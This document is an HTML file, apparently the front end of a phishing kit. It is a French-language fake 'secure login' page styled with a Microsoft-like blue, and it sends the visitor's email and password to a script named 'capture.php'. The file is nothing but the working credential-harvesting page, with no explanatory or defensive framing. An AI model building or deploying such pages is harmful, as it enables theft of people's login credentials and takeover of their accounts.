index.html
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Connexion Sécurisée</title>
  <style>
    body { font-family: sans-serif; background: #f5f5f5; text-align: center; padding-top: 50px; }
    form { background: white; display: inline-block; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px #ccc; }
    input { display: block; margin: 10px auto; padding: 10px; width: 250px; }
    button { background: #0078D4; color: white; padding: 10px 20px; border: none; border-radius: 4px; }
  </style>
</head>
<body>
  <form method="POST" action="capture.php">
    <h2>Connexion sécurisée</h2>
    <input type="email" name="email" placeholder="Adresse email" required>
    <input type="password" name="password" placeholder="Mot de passe" required>
    <button type="submit">Connexion</button>
  </form>
</body>
</html>
